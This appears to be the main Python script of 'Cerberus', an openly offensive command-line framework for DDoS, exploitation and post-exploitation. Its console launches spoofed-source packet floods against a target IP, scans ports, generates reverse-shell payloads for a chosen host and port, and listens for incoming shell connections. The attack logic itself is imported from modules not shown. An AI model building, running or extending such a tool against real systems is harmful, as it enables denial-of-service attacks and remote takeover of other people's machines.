# Importing dependencies

import threading
import socket
import random
import time
import sys
import os

# Loading

for frame in range(16):

    loading_mapping = {0: "|",
    1: "/",
    2: "-",
    3: "\\"}


    loading = loading_mapping[frame % 4]

    print(f"Launching Cerberus {loading}", end="\r")
    time.sleep(0.1)

for _ in range(100):

    print()

# Importing / Downloading colorama

try:
    import colorama
except:
    os.system('python3 -m pip install colorama')
    import colorama

# Title

console = "default"

def load_cerberus():

    if os.name == 'posix': os.system('clear')
    else:  os.system('cls')

    colorama.init()

    logo = """\033[31m


 ██████╗███████╗██████╗ ██████╗ ███████╗██████╗ ██╗   ██╗███████╗
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝██║   ██║███████╗
██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
╚██████╗███████╗██║  ██║██████╔╝███████╗██║  ██║╚██████╔╝███████║
 ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝


    \033[39m"""

    for line in logo.split("\n"):
        print(" " * 10 + line)

    print("- DDoS, Exploitation and Post-Exploitation Framework\n\n\n")

load_cerberus()

# Functions

from flood import *
from scanner import *
from payloads import *
from listen import *

# Console

while True:

    if console == "default":

        command = input("Cerberus/\033[34mConsole\033[39m>").split(' ')

        if command[0] == "help":
            
            if len(command) == 2:
                
                if command[1] == "flood":
                    
                    print("usage: flood -source <source ip> -target <target ip> -port <port> -masked <masked ip> --threads <threads>")
                    print()
                    print("....source - ip address of the source machine")
                    print("....target - ip address of target machine")
                    print("......port - port to send packets through")
                    print("....masked - ip address to spoof packets from")
                    print("...threads - number of threads (if left blank threads are not used)")
                    print()

                if command[1] == "scan":
                    
                    print("usage: scan -target <source ip>")
                    print()
                    print("...target - ip address of the target machine")
                    print()
            
            else:

                print("......help - displays functionality and usage of every command")
                print("......exit - exits the program")
                print(".....clear - clears the screen")
                print(".....flood - floods an address with packets")
                print("......scan - scans an address for open ports")
                print("...exploit - puts console into exploit mode")
                print()

        if command[0] == "exit":

            if os.name == 'posix': os.system('clear')
            else:  os.system('cls')

            break

        if command[0] == "clear":

            load_cerberus()
        
        if command[0] == "flood":
            
            try:

                source = command[command.index("-source") + 1]
                target = command[command.index("-target") + 1]
                port = int(command[command.index("-port") + 1])
                masked = command[command.index("-masked") + 1]

                number_of_threads = 0

                if '--threads' in command:
                    number_of_threads = int(command[command.index("--threads") + 1])

                print("\033[36m[*] flooding\033[39m")

                number_of_requests = 0
                
                if number_of_threads <= 0:

                    flood(source, target, port, masked)
                    print("\033[31m\n[!] session quit unexpectedly\033[39m\n")

                else:

                    for _ in range(number_of_threads):

                        try:
                            
                            thread = threading.Thread(target=flood, args=[source, target, port, masked])
                            thread.start()
                            thread.join()
                            
                        except:
                            
                            pass
                        
            except:
                
                print("\033[31m\n[!] command error\033[39m\n")
                    
        if command[0] == "scan":
        
            try:
        
                target = command[command.index("-target") + 1]
        
                scan_address(target)
                    
            except:
                
                print("\033[31m\n[!] command error\033[39m\n")

        if command[0] == "exploit":

            console = "exploit"
            print()
        
    if console == "exploit":

        command = input("Cerberus/\033[31mExploit\033[39m>").split(' ')

        if command[0] == "help":
            
            if len(command) == 2:
                
                if command[1] == "payload":
                    
                    print("usage: payload -host <host ip> -port <port> -out <path>")
                    print()
                    print("...host - ip address of the host machine")
                    print("...port - port to open connection")
                    print("....out - output file path")
                    print()
                
                if command[1] == "listen":
                    
                    print("usage: payload -host <host ip> -port <port>")
                    print()
                    print("...host - ip address of the host machine")
                    print("...port - port which to listen for connections")
                    print()
            
            else:

                print("......help - displays functionality and usage of every command")
                print("......exit - exits the program")
                print(".....clear - clears the screen")
                print("...payload - generates a payload")
                print("....listen - listens for incoming connections")
                print("......back - returns console to normal mode")
                print()

        if command[0] == "exit":

            if os.name == 'posix': os.system('clear')
            else:  os.system('cls')

            break
        
        if command[0] == "clear":

            load_cerberus()
            
        if command[0] == "payload":
            
            try:
            
                host = command[command.index("-host") + 1]
                port = command[command.index("-port") + 1]
                out = command[command.index("-out") + 1]
                
                print("\033[36m[*] generating payload\033[39m")
                    
                generate_shell_payload(host, port, out)
                
                print("\033[36m[*] payload generated\033[39m")
                print()
            
            except:
                
                print("\033[31m\n[!] command error\033[39m\n")
        
        if command[0] == "listen":
            
            try:
            
                host = command[command.index("-host") + 1]
                port = int(command[command.index("-port") + 1])
                
                print("\033[36m[*] listening for connections\033[39m")
                
                listen_for_connections(host, port)
                    
            except:
                
                print("\033[31m\n[!] command error\033[39m\n")
        
        if command[0] == "back":

            console = "default"
            print()
